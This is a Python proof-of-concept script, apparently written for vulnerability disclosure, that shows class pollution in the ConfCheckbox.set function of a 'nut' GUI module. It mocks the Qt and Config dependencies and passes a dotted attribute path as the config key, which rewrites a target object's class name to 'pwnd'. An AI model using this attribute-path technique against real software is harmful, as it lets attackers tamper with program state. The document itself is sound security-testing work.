# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: ConfCheckbox.set
# Type: get-attr-set-attr

import sys
import types

# Mock Qt and nut dependencies
qt_widgets = types.ModuleType('PyQt5.QtWidgets')
class QCheckBox:
  def __init__(self, *args, **kwargs): pass
  def setChecked(self, *a): pass
  def stateChanged(self): return type('Signal', (), {'connect': lambda *a: None})()
qt_widgets.QCheckBox = QCheckBox
sys.modules['PyQt5'] = types.ModuleType('PyQt5')
sys.modules['PyQt5.QtWidgets'] = qt_widgets
sys.modules['PyQt5.QtCore'] = types.ModuleType('PyQt5.QtCore')

# Mock nut's Config module
config_mod = types.ModuleType('Config')

class Config:
  pass

sys.modules['Config'] = config_mod

from gui.panes.filters import ConfCheckbox

class Target: pass
target = Target()

# Set up Config class to hold our target (as nut does internally)
ConfCheckbox_config_ref = Config
Config.target = target

payload_value = "pwnd"
PAYLOAD = "target.__class__.__name__"

def run_poc():
  # Patch the Config reference in the filters module to our Config
  import gui.panes.filters as filters_mod
  filters_mod.Config = Config
  checkbox = ConfCheckbox.__new__(ConfCheckbox)
  checkbox.conf = PAYLOAD
  checkbox.set(payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
